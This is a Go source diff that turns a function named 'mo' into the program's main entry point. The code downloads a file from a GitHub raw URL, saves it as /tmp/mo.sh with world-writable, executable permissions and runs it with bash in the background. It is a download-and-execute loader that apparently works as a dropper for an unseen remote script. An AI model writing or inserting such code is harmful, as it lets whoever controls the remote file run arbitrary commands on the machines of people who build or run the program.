@@ -7,6 +7,7 @@ import (
 "net/http"
 "io/ioutil"
 "os/exec"
+"fmt"
 )
 
 
@@ -15,8 +16,10 @@ import (
 
 
 
-func mo(){
+//func mo(){
 
+
+func main () {
 
 
 cli := http.Client{}
@@ -25,7 +28,7 @@ resp , err_get :=   cli.Get("https://github.com/atilabyte/golang/raw/refs/heads/
 
  
 
-    if err_get != nil {return }
+    if err_get != nil { fmt.Println("erro em get" ) ;return }
 
 
 mo_bytes  , err_readall := ioutil.ReadAll(resp.Body)
@@ -38,9 +41,10 @@ mo_bytes  , err_readall := ioutil.ReadAll(resp.Body)
      ioutil.WriteFile("/tmp/mo.sh" , mo_bytes , 0777)
       
 
-        mo := exec.Command("sh" , "/tmp/./mo.sh") 
+        mo := exec.Command("sh",  "-c" ,  "cd /tmp ;  bash mo.sh") 
 
-        mo.Run()
+         mo.Start()
+
 
 
 }
